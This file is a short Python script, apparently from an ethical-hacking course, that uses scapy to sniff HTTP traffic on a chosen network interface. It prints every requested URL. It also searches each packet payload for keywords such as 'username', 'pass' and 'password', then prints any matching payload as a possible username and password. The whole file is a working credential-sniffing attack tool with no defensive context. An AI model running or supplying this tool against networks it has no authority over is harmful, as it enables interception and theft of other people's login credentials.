#!/usr/bin/env python

# pip install scapy_http....to be able to filter http traffic

import scapy.all as scapy
from scapy.layers import http
import optparse

def get_arguement():
    parser = optparse.OptionParser()
    parser.add_option("-i","--interface",dest="interface",help="Interface to sniff packets on")
    (options,args) = parser.parse_args()
    if not options.interface:
        print("Enter the interface arguement using -i")
        exit()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #store=False -> Do not store packets in memory.

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "name", "login", "pass", "password", "passwd"]
        for key in keywords:
            if key in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if ".jpg" in url:
            print("[+] Image: "+url)
        else:
            print("[+] HTTP Request: "+url+"\n")
        login = get_login(packet)
        if login:
            print("\n\n[+] Possible username and password: "+login+"\n\n")

option=get_arguement()
sniff(option.interface)
